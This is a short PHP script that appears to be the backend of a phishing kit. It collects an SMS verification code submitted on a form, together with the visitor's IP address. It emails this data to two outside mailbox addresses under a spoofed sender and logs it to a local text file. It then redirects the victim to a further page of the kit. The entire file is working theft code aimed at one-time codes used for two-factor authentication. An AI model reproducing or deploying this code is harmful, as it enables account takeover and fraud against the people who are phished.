<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "======= 3@LIXANDR ========\n";
$message .= "SMS C0DE     : ".$_POST['o18']."\n";
$message .= "---------------------------------\n";
$message .= "VISIT0R IP          : $ip\n";
$message .= "======= 3@LIXANDR ========\n";

$send = "emailzaz127@yandex.com , ajimeaskitiwi@protonmail.com";
$subject = "3ALIXANDR SMS - $ip ";
$headers = "From:3LXNDR <webmaster@localhost.com>";
mail($send,$subject,$message,$headers);
header("Location: ./icez.php");
$txt = fopen('sms.txt', 'a');
fwrite($txt, $message);
fclose($txt);
?>